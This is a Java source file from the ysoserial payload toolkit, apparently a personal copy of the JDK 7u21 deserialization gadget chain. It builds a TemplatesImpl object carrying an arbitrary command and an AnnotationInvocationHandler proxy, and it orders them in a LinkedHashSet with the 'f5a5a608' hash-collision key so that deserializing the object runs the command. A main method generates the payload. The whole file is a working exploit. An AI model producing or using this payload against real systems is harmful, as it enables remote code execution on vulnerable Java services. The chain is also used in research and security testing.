 package ysoserial.payloads;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.JavaVersion;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import javax.xml.transform.Templates;
import java.lang.reflect.InvocationHandler;
import java.util.HashMap;
import java.util.LinkedHashSet;

public class Jdk7u21_my implements ObjectPayload<Object> {

	public Object getObject(final String command) throws Exception {
        TemplatesImpl templates = (TemplatesImpl) Gadgets.createTemplatesImpl(command);

        InvocationHandler ih = (InvocationHandler) Reflections.getFirstCtor(Gadgets.ANN_INV_HANDLER_CLASS).newInstance(Override.class,new HashMap<>());
        Reflections.setFieldValue(ih,"type", Templates.class);
        Templates proxy = Gadgets.createProxy(ih,Templates.class);

        LinkedHashSet set = new LinkedHashSet();//这样可以确保先反序列化 templates 再反序列化 proxy
        set.add(templates);
        set.add(proxy);

        HashMap hm = new HashMap();
        hm.put("f5a5a608",templates);
        Reflections.setFieldValue(ih,"memberValues",hm);

		return set;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(Jdk7u21_my.class, args);
	}

}
